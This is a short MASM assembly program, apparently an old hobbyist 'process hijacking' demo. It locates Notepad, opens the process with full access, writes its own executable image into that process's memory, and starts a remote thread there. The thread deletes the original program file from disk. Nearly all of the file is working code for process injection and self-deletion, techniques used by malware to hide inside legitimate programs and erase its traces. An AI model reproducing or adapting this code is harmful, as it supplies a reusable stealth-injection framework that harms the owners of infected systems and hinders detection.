;Process Hijacking in MASM by Aphex
;This demonstrates how to hijack a foreign process and then delete the original program file.
;http://iamaphex.cjb.net
;unremote@knology.net

.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
szTarget byte 'Notepad', 0
szUser32 byte 'USER32.DLL', 0
szSharedData byte 261 dup (0)

.data?
hModule dword ?
hNewModule dword ?
hProcess dword ?
dwSize dword ?
dwPid dword ?
dwBytesWritten dword ?
dwTid dword ?
.code

HijackedThread proc
invoke LoadLibrary, addr szUser32
invoke DeleteFile, addr szSharedData
invoke MessageBox, 0, addr szTarget, addr szTarget, 0
invoke ExitThread, 0
ret
HijackedThread endp

_entrypoint:
invoke GetModuleHandle, 0
mov hModule, eax
mov edi, eax 
assume edi:ptr IMAGE_DOS_HEADER 
add edi, [edi].e_lfanew
add edi, sizeof dword
add edi, sizeof IMAGE_FILE_HEADER
assume edi:ptr IMAGE_OPTIONAL_HEADER32 
mov eax, [edi].SizeOfImage
mov dwSize, eax
assume edi:NOTHING
invoke GetModuleFileName, 0, addr szSharedData, 261
invoke FindWindow, addr szTarget, 0
invoke GetWindowThreadProcessId, eax, addr dwPid
invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, dwPid
mov hProcess, eax
invoke VirtualFreeEx, hProcess, hModule, 0, MEM_RELEASE
invoke VirtualAllocEx, hProcess, hModule, dwSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE 
mov hNewModule, eax
invoke WriteProcessMemory, hProcess, hNewModule, hModule, dwSize, addr dwBytesWritten
invoke CreateRemoteThread, hProcess, 0, 0, addr HijackedThread, hModule, 0, addr dwTid
invoke ExitProcess, 0
end _entrypoint